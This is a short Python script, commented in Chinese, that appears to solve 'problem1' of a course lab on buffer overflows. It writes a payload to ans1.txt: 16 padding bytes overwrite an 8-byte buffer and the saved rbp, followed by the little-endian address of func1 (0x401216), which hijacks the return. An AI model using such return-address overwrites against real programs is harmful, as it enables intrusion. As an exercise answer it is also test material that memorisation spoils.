# 构造problem1的payload
# 1. padding：填满缓冲区(8字节) + 覆盖saved rbp(8字节) = 16字节
padding = b"A" * 16
# 2. func1的地址（0x401216），64位小端序存储
func1_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"
# 3. 拼接payload
payload = padding + func1_addr

# 保存为二进制文件（必须用wb模式，否则会丢失二进制数据）
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Problem1 payload已生成到ans1.txt")
print(f"Payload长度：{len(payload)} 字节")  # 输出24字节，验证长度正确